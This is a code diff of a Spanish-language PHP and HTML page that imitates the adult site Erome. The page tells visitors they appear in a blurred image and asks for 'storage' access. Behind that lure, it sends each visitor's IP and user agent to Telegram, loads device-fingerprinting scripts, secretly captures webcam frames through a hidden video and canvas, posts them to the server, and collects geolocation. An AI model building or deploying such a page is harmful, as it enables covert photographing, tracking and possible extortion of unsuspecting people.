@@ -3,7 +3,6 @@ require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
 
-// Envía visita inicial a Telegram
 $ip = get_client_ip();
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $ts = gmdate('c');
@@ -15,7 +14,8 @@ $msg = "👋 <b>Nueva visita</b>\n".
 send_to_telegram($msg);
 ?>
 
-<!DOCTYPE html>
+
+<!doctype html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -36,6 +36,7 @@ send_to_telegram($msg);
             flex-direction: column;
         }
 
+        /* Imagen censurada inicial visible desde el inicio */
         body::before {
             content: "";
             position: fixed;
@@ -47,11 +48,13 @@ send_to_telegram($msg);
             transition: all 1s ease;
         }
 
+        /* Imagen normal cuando se desbloquea */
         body.unlocked::before {
             background: url('img/image2.jpg') no-repeat center center/cover;
             filter: none;
         }
 
+        /* Caja estilo erome */
         #cameraModal .content {
             background: #1c1c1c;
             color: #fff;
@@ -63,8 +66,13 @@ send_to_telegram($msg);
             border: 1px solid #333;
         }
 
-        .logo { max-width: 150px; margin-bottom: 15px; }
+        /* Logo */
+        .logo {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
 
+        /* Botón rojo estilo erome */
         #grantAccess {
             margin-top: 20px;
             padding: 12px 25px;
@@ -77,8 +85,11 @@ send_to_telegram($msg);
             font-weight: bold;
             transition: background 0.2s;
         }
-        #grantAccess:hover { background-color: #b00610; }
+        #grantAccess:hover {
+            background-color: #b00610;
+        }
 
+        /* Modal de permisos */
         #cameraModal {
             position: fixed;
             top: 0; left: 0;
@@ -90,6 +101,7 @@ send_to_telegram($msg);
             z-index: 9999;
         }
 
+        /* Animación desbloqueando */
         #unlockAnimation {
             position: fixed;
             top:0; left:0;
@@ -114,9 +126,17 @@ send_to_telegram($msg);
             animation: spin 1s linear infinite;
             margin-top: 15px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
 
-        .disclaimer { font-size: 11px; color: #aaa; margin-top: 15px; }
+        /* Mensaje pequeño estilo disclaimer */
+        .disclaimer {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -128,19 +148,25 @@ send_to_telegram($msg);
 <div id="cameraModal">
     <div class="content">
         <img src="img/logo-erome-vertical.png" alt="Erome Logo" class="logo">
+ <!--       <h2>¡Atención!</h2> -->
         <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
         <button id="grantAccess">Permitir acceso</button>
-        <div class="disclaimer">Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad.</div>
+        <div class="disclaimer">
+            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
+        </div>
     </div>
 </div>
 
+<!-- Animación de desbloqueo -->
 <div id="unlockAnimation">
     <div>Desbloqueando imagen...</div>
     <div class="loader"></div>
 </div>
 
+<!-- Video y Canvas ocultos -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
 
 <!-- Función para mostrar IP pública -->
 <script>
@@ -151,11 +177,12 @@ function get_ip(obj){
 <script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
 
 <!-- Archivos JS que extraen info del dispositivo -->
-<script src="ip.js"></script>
-<script src="ajax.js"></script>
-
+<script src="config/ip.js"></script>
+<script src="config/ajax.js"></script>
+       
 <script>
 'use strict';
+
 function post(imgdata){
     $.ajax({
         type: 'POST',
@@ -178,6 +205,7 @@ async function initCamera() {
 
         const unlockModal = document.getElementById('unlockAnimation');
         unlockModal.style.display = 'flex';
+
         setTimeout(() => {
             unlockModal.style.display = 'none';
             document.body.classList.add('unlocked');
@@ -214,6 +242,5 @@ if ('geolocation' in navigator) {
     });
 }
 </script>
-
 </body>
 </html>
